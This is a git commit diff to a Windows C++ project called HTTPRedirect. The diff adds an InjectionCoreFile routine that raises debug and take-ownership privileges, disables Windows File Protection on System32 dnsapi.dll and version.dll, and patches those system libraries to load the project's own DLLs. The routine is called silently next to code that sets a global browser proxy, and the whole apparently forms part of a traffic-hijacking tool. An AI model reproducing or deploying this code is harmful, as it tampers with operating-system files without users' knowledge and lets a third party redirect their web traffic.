19529e8d5a79500b8c692d7588fe320d84e4f537
ssoor <swnetwork@yeah.net>
2016-04-08 18:18:17 +0800

    新增安装步骤，写死 dnsopi dnsepi

--- HTTPRedirect/HTTPRedirect.cpp
+++ HTTPRedirect/HTTPRedirect.cpp
@@ -4,12 +4,14 @@
 #include "HTTPSeclusion.h"
 #include "HTTPReconnect.h"
 
+#include "SetDll\SetDll_Inferface.h"
 #include "HookControl\HookHelp.h"
 #include "CommonControl\Commondef.h"
 #include <ws2tcpip.h>
 
 #pragma  comment(lib,"WS2_32.lib")
 
+#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "SetDLL.lib")
 #pragma  comment(lib,DIRECTORY_LIB_INTERNAL "HookControl.lib")
 #pragma  comment(lib,DIRECTORY_LIB_INTERNAL "CommonControl.lib")
 
@@ -75,183 +77,6 @@ const wchar_t * __inet_ntopw(int af, in_addr src_addr, wchar_t *dst, socklen_t c
 	return NULL;
 }
 
-int connectAndSendData(const char *szHost, unsigned short nPort, const char *pDataToSend, unsigned int nDataSize, char *pReceiveBuf = NULL, unsigned int *pnReceiveSize = NULL)
-{
-	WORD wVersionRequested = MAKEWORD(1, 1);
-	WSADATA wsaData;
-
-	int err = ::WSAStartup(wVersionRequested, &wsaData);
-	if (0 != err)
-	{
-		printf("[connectAndSendData]: WSAStartup failed. return %d. \r\n", err);
-		return -1;
-	}
-
-	if (wsaData.wVersion != wVersionRequested)
-	{
-		printf("[connectAndSendData]: wsaData.wVersion %d is not equal to wVersionRequested %d.\r\n", wsaData.wVersion, wVersionRequested);
-		::WSACleanup();
-		return -2;
-	}
-
-	SOCKET sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (INVALID_SOCKET == sock)
-	{
-		printf("[connectAndSendData]: socket error %d. \r\n", WSAGetLastError());
-		return -3;
-	}
-
-	struct hostent *p_hostent = gethostbyname(szHost);
-	if (NULL == p_hostent)
-	{
-		printf("[gethostbyname]: socket error %d. \r\n", WSAGetLastError());
-		::closesocket(sock);
-		::WSACleanup();
-		return -4;
-	}
-
-	SOCKADDR_IN addr_server;
-	addr_server.sin_family = AF_INET;
-	addr_server.sin_addr = *((struct in_addr*)p_hostent->h_addr);
-	memset(addr_server.sin_zero, 0, 8);
-	addr_server.sin_port = htons(nPort);
-
-	err = ::connect(sock, (SOCKADDR*)&addr_server, sizeof(addr_server));
-	if (SOCKET_ERROR == err)
-	{
-		printf("[connectAndSendData]: connect %s:%d error %d. \r\n", szHost, nPort, WSAGetLastError());
-		::closesocket(sock);
-		::WSACleanup();
-		return -5;
-	}
-
-	err = ::send(sock, pDataToSend, nDataSize, 0);
-	if (SOCKET_ERROR == err)
-	{
-		printf("[connectAndSendData]: send error %d. \r\n", WSAGetLastError());
-	}
-
-	if (NULL != pReceiveBuf && NULL != pnReceiveSize)
-	{
-		char *p_receive = pReceiveBuf;
-		char *p_buf = p_receive;
-		int n_buf_len = *pnReceiveSize;
-		int n_len = n_buf_len - 1;
-		int n_read = 0;
-		char temp[256];
-		int n_head_len = -1;
-		int n_content_len = -1;
-		const char *content = NULL;
-
-		while (1)
-		{
-			fd_set fds;
-			FD_ZERO(&fds);
-			FD_SET(sock, &fds);
-			struct timeval timeo;
-			timeo.tv_sec = 10;
-			timeo.tv_usec = 1000;
-
-			int ret = select(sock, &fds, NULL, NULL, &timeo);
-			if (ret <= 0)
-				break;
-
-			if (FD_ISSET(sock, &fds))
-			{
-				n_read = ::recv(sock, p_buf, n_len, 0);
-				if (n_read <= 0)
-					break;
-
-				p_buf += n_read;
-				n_len -= n_read;
-				if (n_len == 0)
-					break;
-
-				const char *rnrn = strstr(p_receive, "\r\n\r\n");
-				if (NULL != rnrn && rnrn < p_buf)
-				{
-					rnrn += 4;
-					content = rnrn;
-
-					if (-1 == n_content_len)
-					{
-						const char *content_length = strstr(p_receive, "Content-Length: ");
-						if (NULL != content_length && content_length < p_buf)
-						{
-							content_length += 16;
-							const char *rn = strstr(content_length, "\r\n");
-							if (NULL != rn && rn < p_buf)
-							{
-								int count = rn - content_length;
-								strncpy(temp, content_length, count);
-								temp[count] = '\0';
-								n_content_len = atoi(temp);
-							}
-						}
-
-						if (-1 == n_content_len)
-						{
-							const char *rn = strstr(rnrn, "\r\n");
-							if (NULL != rn && rn < p_buf)
-							{
-								int count = rn - rnrn;
-								strncpy(temp, rnrn, count);
-								temp[count] = '\0';
-								if (1 == sscanf(temp, "%x", &n_content_len))
-								{
-									n_content_len += 7; // 0D 0A 30 0D 0A 0D 0A  
-									content = rn + 2;
-								}
-							}
-						}
-
-						if (-1 == n_content_len)
-						{
-							const char *connection = strstr(p_receive, "Connection: ");
-							if (NULL != connection && connection < p_buf)
-							{
-								connection += 12;
-								const char *rn = strstr(connection, "\r\n");
-								if (NULL != rn && rn < p_buf)
-								{
-									int count = rn - connection;
-									strncpy(temp, connection, count);
-									temp[count] = '\0';
-									connection = _strupr(temp);
-									if (0 == strcmp(connection, "CLOSE"))
-										n_content_len = 0;
-								}
-							}
-						}
-					}
-				}
-
-				if (NULL != content && n_content_len > 0)
-				{
-					n_head_len = content - p_receive;
-					int n_cur_len = p_buf - p_receive;
-					if (n_cur_len >= n_head_len + n_content_len)
-						break;
-				}
-			}
-		}
-
-		n_len = n_buf_len - 1 - n_len;
-		n_buf_len = n_len;
-		p_receive[n_len] = '\0';
-	}
-
-	err = ::closesocket(sock);
-	if (SOCKET_ERROR == err)
-	{
-		printf("[connectAndSendData]: closesocket error %d. \r\n", WSAGetLastError());
-	}
-
-	::WSACleanup();
-
-	return 0;
-}
-
 #define MAX_IP4_STRING_LEN		16
 #define MAX_IP6_STRING_LEN		46
 
@@ -263,6 +88,52 @@ typedef struct _BUSINESS_DATA {
 	USHORT usEncodeSockProt;
 	CHAR szEncodeSockIP[MAX_IP_STRING_LEN + 1];
 }BUSINESS_DATA,* PBUSINESS_DATA;
+
+BOOL EnablePrivilege(LPCTSTR lpszPrivilegeName, BOOL bEnable)
+{
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |
+		TOKEN_QUERY | TOKEN_READ, &hToken))
+		return FALSE;
+	if (!LookupPrivilegeValue(NULL, lpszPrivilegeName, &luid))
+		return TRUE;
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;
+
+	AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL);
+
+	CloseHandle(hToken);
+
+	return (GetLastError() == ERROR_SUCCESS);
+
+}
+
+void InjectionCoreFile() {
+	char szTargetPath[MAX_PATH + 1] = { 0 };
+
+	EnablePrivilege(SE_DEBUG_NAME, TRUE);
+	EnablePrivilege(SE_TAKE_OWNERSHIP_NAME, TRUE);
+
+	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\dnsapi.dll"), szTargetPath, MAX_PATH)) {
+		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\dnsapi.dll"));
+	}
+
+	DisableWFP(szTargetPath);
+	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);
+
+	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
+		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
+	}
+
+	DisableWFP(szTargetPath);
+	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
+
+}
 
 HANDLE WINAPI SetBusinessData(sockaddr_in * paddrPACSocket, sockaddr_in * paddrEncodeSocket)
 {
@@ -280,6 +151,7 @@ HANDLE WINAPI SetBusinessData(sockaddr_in * paddrPACSocket, sockaddr_in * paddrE
 	strcpy(tbdBusinessData.szEncodeSockIP, szBuffer);
 	tbdBusinessData.usEncodeSockProt = ntohs(paddrEncodeSocket->sin_port);
 
+	InjectionCoreFile();
 	SetGlobalWebBrowserProxy(tbdBusinessData.szPACServerIP, tbdBusinessData.usPACServerProt);
 
 	return Common::SetBufferToShareMap("GLOBAL_LINGPAO8_ENCODE_BUSINESS_DATA", &tbdBusinessData, sizeof(BUSINESS_DATA));
